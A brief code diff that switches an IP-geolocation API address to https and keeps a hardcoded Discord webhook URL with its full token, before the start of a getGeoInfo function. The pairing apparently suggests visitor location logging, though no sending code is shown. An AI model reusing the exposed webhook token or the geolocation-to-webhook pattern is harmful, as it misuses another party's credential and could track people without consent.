@@ -1,4 +1,4 @@
-const geoAPI = "http://ip-api.com/json/";
+const geoAPI = "https://ip-api.com/json/";
 const webhookURL = "https://discord.com/api/webhooks/1361652529582047442/6V_CCZ6XV_9L_vnqwF3y3rmrggqGaxDWUI6ldqFojZJ24HG8-ONFy0e6cyNGsjZQg9yN";
 
 async function getGeoInfo() {
